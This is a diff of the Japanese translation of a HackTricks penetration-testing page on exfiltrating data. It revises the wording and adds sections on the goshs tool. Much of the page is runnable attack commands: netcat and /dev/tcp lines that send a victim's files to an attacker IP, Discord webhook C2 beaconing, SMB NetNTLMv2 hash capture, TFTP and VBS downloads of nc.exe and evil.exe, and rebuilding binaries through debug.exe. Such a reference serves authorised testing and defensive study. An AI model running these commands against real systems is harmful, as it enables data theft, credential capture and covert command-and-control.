@@ -3,17 +3,17 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> エンドツーエンドの例として、`C:\Users\Public` に loot をステージし、Rclone を使って正規のバックアップを模倣して exfiltrating するワークフローは以下を確認してください。
+> `C:\Users\Public` に loot を stage し、Rclone を使って正規のバックアップを模倣しながら exfiltrating する end-to-end の例については、以下の workflow を確認してください。
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## 情報を exfiltrate するために一般的にホワイトリスト登録されるドメイン
+## Commonly whitelisted domains to exfiltrate information
 
-悪用可能な一般的にホワイトリスト登録されるドメインを見つけるには [https://lots-project.com/](https://lots-project.com/) を確認してください
+[https://lots-project.com/](https://lots-project.com/) を確認して、悪用できる一般的に whitelisted な domains を見つけてください
 
-## コピー\&ペースト Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -49,11 +49,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### ファイルのアップロード
+### ファイルをアップロード
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Pythonモジュール [uploadserver](https://pypi.org/project/uploadserver/):
+- [**GET と POST（ヘッダーも含む）を表示する SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- Python モジュール [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -107,9 +107,41 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) を使った C2 & Data Exfiltration
+### goshs
 
-WebhooksはJSONと任意のファイルパートを受け付ける書き込み専用のHTTPSエンドポイントです。信頼されたSaaSドメインで許可されることが多く、OAuth/APIキーを必要としないため、低摩擦のbeaconingやexfiltrationに便利です。
+[goshs](https://github.com/patrickhener/goshs) は、upload、download、WebDAV、SFTP、SMB、TLS、authentication、share links、
+および OOB collaboration features（DNS、SMTP、NTLM hash capture）を備えた、`python3 -m http.server` の単一バイナリ版の代替です。
+```bash
+# Serve current directory on port 8000
+goshs
+
+# Serve with HTTPS (self-signed)
+goshs -s -ss
+
+# Serve with basic auth
+goshs -b user:password
+
+# Upload-only mode
+goshs -uo
+
+# Read-only mode
+goshs -ro
+
+# Capture SMB NTLM hashes
+goshs -smb -smb-domain CORP
+
+# DNS callback server
+goshs -dns -dns-ip 10.10.10.10
+
+# SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+
+# Tunnel via localhost.run (no port forwarding needed)
+goshs -tunnel
+```
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
+
+Webhooksは、JSONと任意のファイルパートを受け付ける書き込み専用のHTTPSエンドポイントです。trusted SaaS domains に対して一般的に許可されており、OAuth/API keysも不要なため、低摩擦なbeaconingとexfiltrationに有用です。
 
 Key ideas:
 - Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
@@ -184,9 +216,9 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-注意:
-- 同様のパターンは、incoming webhooks を使用する他のコラボレーションプラットフォーム（Slack/Teams）にも当てはまります。URL と JSON schema をそれに応じて調整してください。
-- Discord Desktop の cache artifacts に関する DFIR と webhook/API の復旧については、次を参照してください:
+Notes:
+- Similar patterns apply to other collaboration platforms (Slack/Teams) using their incoming webhooks; adjust URL and JSON schema accordingly.
+- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -194,7 +226,7 @@ Start-Sleep -Seconds 20
 
 ## FTP
 
-### FTP サーバー (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -204,7 +236,7 @@ python3 -m pyftpdlib -p 21
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTPサーバ (pure-ftp)
+### FTPサーバー (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -235,14 +267,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali をサーバーとして
+Kali をサーバーとして使用
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-または smb share を **samba を使用して** 作成する:
+または **samba** を使用して smb share を作成する:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -265,15 +297,25 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
+### goshs
+[goshs](https://github.com/patrickhener/goshs) は、単一バイナリの代替であり、
+SMB 経由でファイルを提供し、接続してきたクライアントから NetNTLMv2 ハッシュを取得します:
+```bash
+# Start SMB server with NTLM hash capture
+goshs -smb -smb-domain CORP
+
+# Also works for plain HTTP file serving
+goshs
+```
 ## SCP
 
-攻撃者はSSHdが稼働している必要がある。
+攻撃者はSSHdを稼働させておく必要があります。
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-被害者が SSH を利用できる場合、攻撃者は被害者のディレクトリを攻撃者側にマウントできます。
+被害者がSSHを持っている場合、攻撃者は被害者のディレクトリを攻撃者側にマウントできます。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -286,19 +328,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### 被害者からファイルをダウンロード
+### 被害者からファイルをダウンロードする
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### 被害者へファイルをアップロード
+### victim にファイルを upload する
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-感謝: **@BinaryShadow\_**
+**@BinaryShadow\_** に感謝
 
 ## **ICMP**
 ```bash
@@ -320,33 +362,46 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-SMTPサーバーにデータを送信できる場合、pythonでデータを受信するためのSMTPサーバーを作成できます:
+SMTP サーバーにデータを送信できるなら、python でそのデータを受け取るための SMTP を作成できます:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) は、OOB exfiltration シナリオ中に email callback を捕捉するための簡易 SMTP server をすばやく起動できます:
+```bash
+# Start SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+```
+受信したメールとコールバックは、ターミナル出力に直接表示されます。
+DNS callback server と組み合わせることで、完全な OOB coverage を実現できます:
+```bash
+# DNS + SMTP combined
+goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
+```
 ## TFTP
 
-既定では XP と 2003 に含まれています（その他ではインストール時に明示的に追加する必要があります）
+XP と 2003 ではデフォルトで有効（他ではインストール時に明示的に追加する必要あり）
 
-Kaliでは、**start TFTP server**:
+Kali では、**TFTP server を起動**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**pythonでのTFTPサーバー:**
+**python の TFTP server:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**victim** で Kali サーバーに接続します:
+In **victim**, Kaliサーバーに接続する:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP のワンライナーでファイルをダウンロードする:
+PHP の oneliner でファイルをダウンロードする:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -388,21 +443,22 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` プログラムはバイナリの解析だけでなく、**hex からそれらを再構築する機能**も備えています。つまり、バイナリの hex を与えることで、`debug.exe` はそのバイナリファイルを生成できます。ただし、debug.exe には **ファイルを最大 64 kb までアセンブルする制限** がある点に注意してください。
+`debug.exe` プログラムはバイナリの検査を行えるだけでなく、**hex から再構築する機能**も持っています。つまり、バイナリの hex を与えることで、`debug.exe` はそのバイナリファイルを生成できます。ただし、`debug.exe` には **64 kb までのサイズのファイルしか assemble できない** という制限があることに注意が必要です。
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-そのテキストを windows-shell にコピー＆ペーストすると、nc.exe というファイルが作成されます。
+Then copy-paste the text into the windows-shell and a file called nc.exe will be created.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
 
-## 参考資料
+## References
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
